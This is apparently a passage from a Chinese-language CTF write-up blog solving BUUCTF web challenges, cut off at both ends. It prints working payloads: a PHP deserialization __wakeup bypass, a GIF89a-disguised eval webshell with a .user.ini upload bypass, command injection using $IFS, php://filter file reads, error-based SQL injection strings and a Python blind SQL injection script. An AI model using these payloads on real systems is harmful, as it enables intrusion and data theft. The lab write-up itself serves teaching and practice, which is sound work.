<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在调用__destruct()的时候，username=admin，password=100的时候输出flag，因此我们 需要构造一个序列化，使得username=admin，password=100</p>
<p>可以将下面的代码复制到在线php执行或者复制到phpstudy的www目录下访问都可以，就会输出值</p>
<p>在线php网址：<a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">https://tool.lu/coderunner/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 进行实例化</span><br><span class="line">$a &#x3D; new Name(&#39;admin&#39;, 100);</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620185451166.png" alt="image-20200620185451166"></p>
<p>复制将上面代码复制出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()魔法函数。而且因为是private声明，我们需要在<strong>类名和字段名前面都会加上\0的前缀</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620184615544.png" alt="image-20200620184615544"></p>
<p><strong>PHP魔法函数</strong></p>
<p>php类中包含了一些魔法函数，这些函数可以再脚本的任何地方不用声明就可以使用</p>
<p>与php（反）序列化有关的魔法函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_construct()	&#x2F;&#x2F; 当一个对象创建时调用</span><br><span class="line">_destruct()		&#x2F;&#x2F; 当对象被销毁时触发</span><br><span class="line">_wakeup()		&#x2F;&#x2F; 使用unserialize时触发</span><br><span class="line">_sleep()		&#x2F;&#x2F; 使用serialize时触发</span><br><span class="line">_toString()		&#x2F;&#x2F; 把类当做字符串使用的时触发</span><br><span class="line">_get()			&#x2F;&#x2F; 用于从不可访问的属性读取数据</span><br><span class="line">————————————————————————————————————————————————</span><br><span class="line">_set()			&#x2F;&#x2F; 用于将数据写入不可访问的属性</span><br><span class="line">_isset()		&#x2F;&#x2F; 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">_unset()		&#x2F;&#x2F; 在不可访问的属性上使用unset()时触发</span><br><span class="line">_invoke()		&#x2F;&#x2F; 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开页面</p>
<p>是一个文件上传漏洞，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620222538324.png" alt="image-20200620222538324"></p>
<p>尝试一下上传一句话木马</p>
<p>返回了illegal suffix!，非法后缀，那么就上传图片码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223047850.png" alt="image-20200620223047850"></p>
<p>将文件后缀改为图片后缀</p>
<p>返回了&lt;? in contents!，说明不能使用<code>&lt;?</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223209799.png" alt="image-20200620223209799"></p>
<p>然后将内容伪造成<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;123&#39;]);&lt;/script&gt;</code></p>
<p>返回了exif_imagetype:not image!，意思这个文件不是图像，这个简单伪造一个文件头就行，在文件头部加入GIF89a来进行伪造</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224157308.png" alt="image-20200620224157308"></p>
<p>伪造之后进行提交，发现成功提交了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224350841.png" alt="image-20200620224350841"></p>
<p>经过上面的错误可以得到以下几点内容</p>
<p>1、不能上传带有<code>&lt;?</code>的文件</p>
<p>2、上传文件必须含有图片头</p>
<p>经过以上两点内容，我们可以先上上传一个.user.ini进去，用来解析含有php代码的图片，即可达到绕过限制的目的</p>
<h5 id="介绍-user-ini"><a href="#介绍-user-ini" class="headerlink" title="介绍.user.ini"></a>介绍.user.ini</h5><p>.user.ini上传\隐藏后门</p>
<p>上传条件：</p>
<ul>
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI/FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ul>
<p>两种参数介绍</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  &#x2F;&#x2F;绕过exif_imagetype()</span><br><span class="line">auto_prepend_file&#x3D;a.jpg &#x2F;&#x2F;指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span><br><span class="line">auto_append_file&#x3D;a.jpg  &#x2F;&#x2F;解析后进行包含</span><br></pre></td></tr></table></figure>

<p>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache</p>
<p>这里我们就构造.user.ini文件，内容是<code>auto_prepend_file=图片名称</code></p>
<p>这里我们的图片名称是123.jpg所以就要将.user.ini里的图片名称改为123.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225047364.png" alt="image-20200620225047364"></p>
<p>然后进行上传，返回了一个index.php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225146776.png" alt="image-20200620225146776"></p>
<p>上传的地址，在后面加上index.php然后进行访问</p>
<p>url：<code>http://dc82f315-0e45-4911-9f8d-05bb8e8d0d23.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</code></p>
<p>页面返回了这个文件伪造的头部，这样说明成功了，如果出现错误，就例如页面打不开等，检查一下.user.ini和图片码中的代码结尾处是否有空格，图片码没试过，但是.user.ini如果你在内容的后面加空格的话，然后上传，是无法显示内容的，菜刀、蚁剑也连接不上</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225323155.png" alt="image-20200620225323155"></p>
<p>这样复制url在蚁剑中进行连接，打开蚁剑 ，右键空白处，点击添加数据，粘贴URL输入密码，然后测试连接，连接成功后，点击添加。完成后双击添加的数据即可进入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225802515.png" alt="image-20200620225802515"></p>
<p>在左上角目录列表处点击<code>/</code>，查看全部目录，将内容拉倒最底部，会发现一个flag文件，双击打开里面就是flag值，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225851432.png" alt="image-20200620225851432"></p>
<p>打开flag文件后显示以下内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225940707.png" alt="image-20200620225940707"></p>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>打开页面</p>
<p>其实看到题目的时候应该就知道这个一个关于shell连接的题</p>
<p>看到内容已经给你答案了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230237557.png" alt="image-20200620230237557"></p>
<p>直接复制URL到菜刀或者蚁剑，密码页面已经给到了，就是Syc，连接即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230404458.png" alt="image-20200620230404458"></p>
<p>进入目录后还是点击<code>/</code>查看全部目录，然后拉到最后，找到flag文件，双击文件进去，就可以看到flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230449555.png" alt="image-20200620230449555"></p>
<p>复制flag提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230538643.png" alt="image-20200620230538643"></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>查看页面</p>
<p>看了看发现没有什么关注的点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621121654181.png" alt="image-20200621121654181"></p>
<p>使用burp抓包看看，将包发送到Repeater模块，审计一下源码。发现一个Secret.php，在URL中访问一下看看返回什么</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621122341875.png" alt="image-20200621122341875"></p>
<p>页面返回，<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>说不是从后面的网址访问的，这个一看就是要伪造Reperer</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123038660.png" alt="image-20200621123038660"></p>
<p>发现返回了，<code>Please use &quot;Syclover&quot; browser</code>，让其限制浏览器，伪造一下User-Agent，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123717787.png" alt="image-20200621123717787"></p>
<p>发现又返回说不是本地访问，在伪造一下X-Forwarded-For</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123849566.png" alt="image-20200621123849566"></p>
<p>伪造之后发现返回flag，左侧红线处是伪造的内容。复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621124040452.png" alt="image-20200621124040452"></p>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>查看页面</p>
<p>可以根据题目和网页内容可以看出这可以ping地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161807677.png" alt="image-20200621161807677"></p>
<p>在URL构造一下试试，发现成功了。可以猜测这是命令执行</p>
<p>使用分号分隔，然后尝试ls命令看看能否列出文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161914064.png" alt="image-20200621161914064"></p>
<p>发现使用ls后成功将文件列出来了。看到有flag文件，我们使用cat命令来查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162103524.png" alt="image-20200621162103524"></p>
<p>发现提示非法空格，说明空格不能使用，这样就需要绕过空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162147692.png" alt="image-20200621162147692"></p>
<p>绕过空格有一下几种内容</p>
<ul>
<li>%20、%09、$IFS、${IFS} 、$IFS$1、&lt; 、&lt;&gt; 、{cat,flag.php}</li>
</ul>
<p>这里经过测试发现$IFS$1可以使用，然后查看一下index.php文件</p>
<p>得到以下代码</p>
<p>可以看到过滤了&amp;，/，?，*，&lt;，&gt;，\x{00}-\x{1f}，‘，”，\，(，)，[，]，{，}，空格，bash，flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里可以使用变量拼接绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>

<p>页面返回正常的时候按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163343886.png" alt="image-20200621163343886"></p>
<p>发现flag就在源码中，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163431390.png" alt="image-20200621163431390"></p>
<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>打开页面</p>
<p>发现有一个超链接，点击进去看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233751090.png" alt="image-20200621233751090"></p>
<p>返回了<code>Can you find out the flag?</code>，但是发现URL中有<code>?file=flag.php</code>，第一反应就是用<code>php://input</code>伪协议</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233900931.png" alt="image-20200621233900931"></p>
<p>使用<code>php://input</code>伪协议页面返回，发现被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234138692.png" alt="image-20200621234138692"></p>
<p>然后考虑一下是不是<code>php://filter</code>伪协议</p>
<p>尝试一下看看页面返回</p>
<p>Payload：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>页面返回了base64，复制解密一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234352974.png" alt="image-20200621234352974"></p>
<p>发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234442026.png" alt="image-20200621234442026"></p>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>打开页面</p>
<p>在登录框中输入数字看看返回什么东西</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165408704.png" alt="image-20200622165408704"></p>
<p>这里就先输入1，返回了Hello, glzjin wants a girlfriend.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165624243.png" alt="image-20200622165624243"></p>
<p>输入2看看，返回了Do you want to be my girlfriend?，当输入3的时候页面返回了错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165641410.png" alt="image-20200622165641410"></p>
<p>这里就可以猜测是sql注入了，而且有两个字段，然后我们按照平常的姿势来注入，发现都不行，使用burpsuite抓包进行爆破，看看过滤了哪些字符，可以看到482长度的都是过滤了的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622171254105.png" alt="image-20200622171254105"></p>
<p>这样我们就可以使用异或来进行注入</p>
<p>这里的两个flag是因为页面上已经写上了</p>
<p>pyload：<code>0^(ascii(substr((select(flag)from(flag))1,1)&gt;1)</code></p>
<p>这样因为是盲注手注也行，但是太慢了，这里我们使用脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;29818d74-a256-4cfa-8521-0a24e85f886c.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line"># flag长度</span><br><span class="line">for x in range(1,50):</span><br><span class="line"># ascii常用字符</span><br><span class="line">    right&#x3D;137</span><br><span class="line">    left&#x3D;30</span><br><span class="line"># 二分法，去头去尾取中间</span><br><span class="line">    mid&#x3D;(right+left)&#x2F;&#x2F;2</span><br><span class="line"></span><br><span class="line">    while right &gt; left:</span><br><span class="line">        payload &#x3D; &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &quot;id&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        resopnse&#x3D;requests.post(url,data&#x3D;data)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">       # 这里多行注释不能使用单引号，因为if的下面的Hello是单引号，这样就会导致报错</span><br><span class="line">		&quot;&quot;&quot;</span><br><span class="line">        Hello是因为当你输入1的时候返回的值</span><br><span class="line">        值能取逗号前或者逗号后的值，不能乱取。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if &#39;Hello&#39; in resopnse.text:</span><br><span class="line">        # 每次最左侧都往又位移1次，如果不加1就会一直返回一个值</span><br><span class="line">            left&#x3D;mid+1</span><br><span class="line">        else:</span><br><span class="line">        # 因为二分法，最左侧就是中间位置。</span><br><span class="line">            right&#x3D;mid</span><br><span class="line">        mid&#x3D;(right+left)&#x2F;&#x2F;2</span><br><span class="line">    flag+&#x3D;chr(int(mid))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622173524051.png" alt="image-20200622173524051"></p>
<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105401888.png" alt="image-20200623105401888"></p>
<p>扫描一下目录</p>
<p>可以看到有一个robots.txt文件，在页面中打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105918392.png" alt="image-20200623105918392"></p>
<p>页面有返回一个.bak后缀的文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110015243.png" alt="image-20200623110015243"></p>
<p>先注册个账号，这是我注册好的，点击蓝色超链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224005633.png" alt="image-20200622224005633"></p>
<p>在访问<code>/user.php.bak</code>看看下载下来一个.apk的文件，然后查看返回一下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();		&#x2F;&#x2F; 输出一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);	&#x2F;&#x2F; 设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);	&#x2F;&#x2F; 设置curl参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);	&#x2F;&#x2F; 关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计源码发现get()函数存在SSRF(服务端请求伪造)漏洞</p>
<p>这里先随便注册个用户登录</p>
<p>登录后发现有?no=1，第一反应就是注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224044845.png" alt="image-20200622224044845"></p>
<p>先测试报错，看看有没有注入，加入单引号报错，说明有注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224125099.png" alt="image-20200622224125099"></p>
<p>查看注入点，注意这里只是用单引号看看会不会报错，但是注入的时候是不加单引号的，使用<code>order by 5</code>发现没有5这个字段，然后尝试4</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224434281.png" alt="image-20200622224434281"></p>
<p><code>order by 4</code>发现页面返回正常，说明注入字段是4，然后经过测试union select被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224915250.png" alt="image-20200622224915250"></p>
<p>然后因为页面报错，我们使用报错注入试试，因为反正知道了注入点有四个，基本上都是后两个，尝试一下就行</p>
<p>payload:<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)</code></p>
<p>页面返回了users，当前数据库是users，在查看表</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225025442.png" alt="image-20200622225025442"></p>
<p>查看表</p>
<p>payload：<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)</code></p>
<p>返回了以下数据，因为不知道flag在哪，挨个查看一下吧，还是先查看username和passwd</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225417922.png" alt="image-20200622225417922"></p>
<p>着了查其他的都查看了，有用的数据在data，这里查看data数据</p>
<p>payload：<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(data</code></p>
<p><code>) from users)),1)</code></p>
<p>页面返回了一个序列化格式这个正是跟.apk里面的内容一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110847751.png" alt="image-20200623110847751"></p>
<p>选取.apk中有用的数据</p>
